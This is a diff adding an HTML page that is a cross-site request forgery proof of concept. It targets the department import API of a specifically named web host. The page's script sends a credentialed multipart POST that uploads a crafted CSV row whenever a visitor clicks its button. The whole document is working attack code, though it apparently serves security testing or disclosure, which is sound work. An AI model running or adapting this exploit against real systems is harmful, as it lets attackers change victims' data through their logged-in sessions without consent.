@@ -1,0 +1,36 @@
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+  <script>
+    function submitRequest() {
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://conrepo.mirait-dd.com/api/department/import", true);
+      xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
+      xhr.setRequestHeader("Accept-Language", "ja,en-US;q=0.7,en;q=0.3");
+      xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------293240972227969987588771928");
+      xhr.withCredentials = true;
+
+      var body = ""
+        + "-----------------------------293240972227969987588771928\r\n"
+        + "Content-Disposition: form-data; name=\"file\"; filename=\"department.csv\"\r\n"
+        + "Content-Type: application/vnd.ms-excel\r\n"
+        + "\r\n"
+        // \xef\xbb\xbf
+        + "\xef\xbb\xbf\"code\",\"name\",\"honbu_code\",\"sort_order\",\"is_delete\"\n"
+        + "\"99\",\"csrf 2\",\"99\",99,0\r\n"
+        + "-----------------------------293240972227969987588771928--\r\n";
+
+      var aBody = new Uint8Array(body.length);
+      for (var i = 0; i < aBody.length; i++)
+        aBody[i] = body.charCodeAt(i);
+
+      xhr.send(new Blob([aBody]));
+    }
+  </script>
+
+  <form action="#">
+    <input type="button" value="Submit request" onclick="submitRequest();" />
+  </form>
+
+</body>
+</html>
